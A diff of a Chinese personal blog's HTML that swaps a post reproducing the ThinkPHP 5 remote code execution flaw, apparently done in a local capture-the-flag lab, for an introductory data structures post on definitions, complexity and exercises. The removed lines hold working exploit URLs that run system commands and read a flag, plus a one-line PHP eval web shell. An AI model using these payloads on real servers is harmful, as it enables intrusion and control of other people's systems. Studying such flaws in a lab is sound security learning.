@@ -24,32 +24,29 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="基于对RCE的学习，对著名的thinkphpv5进行漏洞复现">
+  <meta name="description" content="数据结构入门的一些概念，定义，算法，复杂度等">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RCE————thinkphp5">
-<meta property="og:url" content="http://example.com/2022/08/11/thinkphp5/index.html">
+<meta property="og:title" content="数据结构绪论">
+<meta property="og:url" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/index.html">
 <meta property="og:site_name" content="阿卡丽的黑心商店">
-<meta property="og:description" content="基于对RCE的学习，对著名的thinkphpv5进行漏洞复现">
+<meta property="og:description" content="数据结构入门的一些概念，定义，算法，复杂度等">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/11.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/2.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/3.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/4.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/5.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/6.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/7.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/8.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/9.png">
-<meta property="og:image" content="http://example.com/2022/08/11/thinkphp5/10.png">
-<meta property="article:published_time" content="2022-08-11T09:53:33.720Z">
-<meta property="article:modified_time" content="2022-08-11T07:36:14.000Z">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/1.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520173714417.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/3.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/4.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/5.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/6.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182104382.png">
+<meta property="og:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182039190.png">
+<meta property="article:published_time" content="2022-08-13T08:24:44.000Z">
+<meta property="article:modified_time" content="2022-08-13T08:35:53.124Z">
 <meta property="article:author" content="akali">
-<meta property="article:tag" content="网络攻防">
-<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="数据结构">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/08/11/thinkphp5/11.png">
+<meta name="twitter:image" content="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/1.png">
 
-<link rel="canonical" href="http://example.com/2022/08/11/thinkphp5/">
+<link rel="canonical" href="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/">
 
 
 <script id="page-configurations">
@@ -62,7 +59,7 @@
   };
 </script>
 
-  <title>RCE————thinkphp5 | 阿卡丽的黑心商店</title>
+  <title>数据结构绪论 | 阿卡丽的黑心商店</title>
   
 
 
@@ -163,7 +160,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/11/thinkphp5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/akali.png">
@@ -176,7 +173,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          RCE————thinkphp5
+          数据结构绪论
         </h1>
 
         <div class="post-meta">
@@ -188,7 +185,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-08-11 17:53:33 / 修改时间：15:36:14" itemprop="dateCreated datePublished" datetime="2022-08-11T17:53:33+08:00">2022-08-11</time>
+              <time title="创建时间：2022-08-13 16:24:44 / 修改时间：16:35:53" itemprop="dateCreated datePublished" datetime="2022-08-13T16:24:44+08:00">2022-08-13</time>
             </span>
 
           
@@ -202,20 +199,69 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p> 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现</p>
+        <p>数据结构入门的一些概念，定义，算法，复杂度等</p>
 <span id="more"></span>
 
-<h2 id="搭建ThinkPHP-V5框架"><a href="#搭建ThinkPHP-V5框架" class="headerlink" title="搭建ThinkPHP V5框架"></a>搭建ThinkPHP V5框架</h2><p>首先搭建ThinkPHP V5框架，搭建过程可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jack_num1/article/details/105918659">thinkphp5环境搭建</a><br><img src="/2022/08/11/thinkphp5/11.png" style="zoom:50%;"><img src="/2022/08/11/thinkphp5/2.png" style="zoom:50%;"><br>在这个页面中可以看到并没有靶场给的那么明显的输入框，那么唯一的输入框就是ip地址的输入框</p>
-<h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>进行注入尝试<br>输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php？s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;whoami<br>即在原地址后插入了从？s到whoami的命令。因为该框架是基于php语言构建所以可以执行linux命令<br>输出：<img src="/2022/08/11/thinkphp5/3.png" style="zoom:80%;"></p>
-<h2 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h2><p>可以看到是存在命令执行漏洞的，尝试写入shell（后门木马）<br>输入：<img src="/2022/08/11/thinkphp5/4.png"><br>可以在thinkphpv5安装的地址中找到shell.php文件，推荐进行这步关闭防火墙，因为即便shell.php文件是空的，系统仍会警告然后删掉<br>输出：</p>
-<img src="/2022/08/11/thinkphp5/5.png" style="zoom:67%;">
+<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>数据：信息的载体，被<strong>计算机程序识别和处理</strong>的符号的集合</p>
+<p>数据元素：数据的<strong>基本单位</strong>，作为一个整体进行考虑和处理。可由若干<strong>数据项</strong>组成，数据项时构成数据元素的不可分割的<strong>最小单位</strong></p>
+<p>组合项：由更细分的属性组成的数据项</p>
+<p>数据对象：具有<strong>相同性质的数据元素的集合</strong>，是数据的一个子集</p>
+<p>数据结构：相互之间存在一种或多种特定关系的数据元素的集合</p>
+<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>对特定问题求解步骤的一种描述</p>
+<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><pre><code>       有穷性：算法是有穷的，程序可以是无穷的（死循环不是算法）
 
-<p><strong>注意:需要对特殊字符使用^转义(cmd环境下转义方式),windows环境的echo命令输出字符串到文档不<br>用引号(单引号、双引号),部分字符url编码不编码都行。</strong><br>shell.php文件内容为&lt;?php @eval($_POST[cmd];?)</p>
-<h2 id="夺旗"><a href="#夺旗" class="headerlink" title="夺旗"></a>夺旗</h2><p>(1)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;<br>输出：<img src="/2022/08/11/thinkphp5/6.png" style="zoom:80%;"></p>
-<p>(2)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;ls &#x2F;flag<br>输出：<img src="/2022/08/11/thinkphp5/7.png" style="zoom:80%;"></p>
-<p>(3)输入：localhost&#x2F;tp5&#x2F;public&#x2F;index.php?<br>s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1] []&#x3D;cat &#x2F;flag<br>输出：<img src="/2022/08/11/thinkphp5/8.png" style="zoom:80%;"></p>
-<h2 id="通过phpinfo函数查看phpinfo-信息"><a href="#通过phpinfo函数查看phpinfo-信息" class="headerlink" title="通过phpinfo函数查看phpinfo()信息"></a>通过phpinfo函数查看phpinfo()信息</h2><h3 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：<img src="/2022/08/11/thinkphp5/9.png"></h3><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：<img src="/2022/08/11/thinkphp5/10.png" style="zoom:80%;"></h3><hr>
-<p>相关源码部分正在学习，之后补上，可别忘了</p>
+       确定性：相同的输入只能得到相同的输出
+
+       可行性
+
+       输入：0个或多个
+
+       输出：1个或多个
+</code></pre>
+<h3 id="好算法的特质"><a href="#好算法的特质" class="headerlink" title="好算法的特质"></a>好算法的特质</h3><pre><code>        正确性
+
+        可读性
+
+        健壮性：输入非法数据时，能适当作出反应进行处理
+
+        高效率，低存储需求：时间空间复杂度低
+</code></pre>
+<h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>常对幂指阶<br>$$<br>O(1)&lt;O(log_2n)&lt;O(n)&lt;O(nlog_2n)&lt;O(n^2)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)<br>$$</p>
+<p>考虑数量级<br>$$<br>T(n)&#x3D;O(f(n)) \Leftrightarrow \lim\limits_{n\rightarrow\infty}\frac{T(n)}{f(n)}<br>$$<br>加法<br>$$<br>T(n)&#x3D;T_1(n)+T_2(n)&#x3D;O(f(n))+O(g(n))&#x3D;O(max(f(n),g(n))<br>$$<br>乘法<br>$$<br>T(n)&#x3D;T_1(n)*T_2(n)&#x3D;O(f(n))*O(g(n))&#x3D;O(f(n)*g(n))<br>$$</p>
+<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>越高级的语言执行效率越低</p>
+<h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>函数递归调用带来的内存开销，递归调用深度x与问题规模n的关系：x&#x3D;f（n）</p>
+<h3 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h3><p>逻辑结构		数据运算		存储结构</p>
+<h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/1.png" style="zoom: 80%;">
+
+<p>集合：数据元素同属于一个集合，没有其他关系</p>
+<p>线性结构  ：只存在一对一的关系</p>
+<p>树形结构  ：存在一对多的关系</p>
+<p>网状结构或图状结构：存在多对多的关系</p>
+<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520173714417.png" style="zoom:80%;">
+
+<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p>1）顺序存储：逻辑上相邻物理上也相邻</p>
+<p>2）链式存储：借助指针来表示元素之间的逻辑关系</p>
+<p>3）索引存储：建立附加的索引表，索引项的一般形式（关键字，地址）</p>
+<p>4）散列存储：哈希存储，根据元素的关键字</p>
+<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>1.可以用（）定义一个完整的数据结构                  <strong>D</strong></p>
+<p>   A.数据元素	B.数据对象	C.数据关系	D.抽象数据结构</p>
+<p>2.数据结构的说法中，正确的（）						<strong>A</strong></p>
+<pre><code>A.数据的逻辑结构独立于其存储结构       
+
+B.数据的存储结构独立于其逻辑结构				//存储结构是逻辑结构在计算机上的映射
+
+C.数据的逻辑结构唯一决定其存储结构
+
+D.数据结构仅由其逻辑结构和存储结构决定
+</code></pre>
+<p>3.<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/3.png">				<strong>A</strong></p>
+<p> <img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/4.png"></p>
+<p>4.<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/5.png"></p>
+<p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/6.png"></p>
+<p>5.算法原地工作的含义是指算法所需的辅助空间是常量。</p>
+<p>   时间复杂度总是考虑最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p>
+<p>7.<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182104382.png"></p>
+<p> <img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182039190.png"></p>
 
     </div>
 
@@ -264,8 +310,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" rel="tag"># 网络攻防</a>
-              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag"># 数据结构</a>
           </div>
 
         
@@ -274,12 +319,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/08/10/RCE/" rel="prev" title="RCE">
-      <i class="fa fa-chevron-left"></i> RCE
+    <a href="/2022/08/11/thinkphp5/" rel="prev" title="RCE————thinkphp5">
+      <i class="fa fa-chevron-left"></i> RCE————thinkphp5
     </a></div>
       <div class="post-nav-item">
-    <a href="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/" rel="next" title="数据结构绪论">
-      数据结构绪论 <i class="fa fa-chevron-right"></i>
+    <a href="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%BA%BF%E6%80%A7%E8%A1%A8/" rel="next" title="数据结构--线性表">
+      数据结构--线性表 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -339,7 +384,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAThinkPHP-V5%E6%A1%86%E6%9E%B6"><span class="nav-number">1.</span> <span class="nav-text">搭建ThinkPHP V5框架</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E5%B0%9D%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">初步尝试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="nav-number">3.</span> <span class="nav-text">写入木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%BA%E6%97%97"><span class="nav-number">4.</span> <span class="nav-text">夺旗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87phpinfo%E5%87%BD%E6%95%B0%E6%9F%A5%E7%9C%8Bphpinfo-%E4%BF%A1%E6%81%AF"><span class="nav-number">5.</span> <span class="nav-text">通过phpinfo函数查看phpinfo()信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%85%A5%EF%BC%9A"><span class="nav-number">5.1.</span> <span class="nav-text">输入：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A"><span class="nav-number">5.2.</span> <span class="nav-text">输出：</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-number">1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%97%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">算法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%80%A7"><span class="nav-number">2.1.</span> <span class="nav-text">特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%BD%E7%AE%97%E6%B3%95%E7%9A%84%E7%89%B9%E8%B4%A8"><span class="nav-number">2.2.</span> <span class="nav-text">好算法的特质</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E6%9D%82%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">复杂度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6"><span class="nav-number">3.1.</span> <span class="nav-text">时间复杂度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6"><span class="nav-number">3.2.</span> <span class="nav-text">空间复杂度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%89%E8%A6%81%E7%B4%A0"><span class="nav-number">3.3.</span> <span class="nav-text">数据结构三要素</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84"><span class="nav-number">3.3.1.</span> <span class="nav-text">逻辑结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84"><span class="nav-number">3.3.2.</span> <span class="nav-text">存储结构</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%A0%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">习题</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
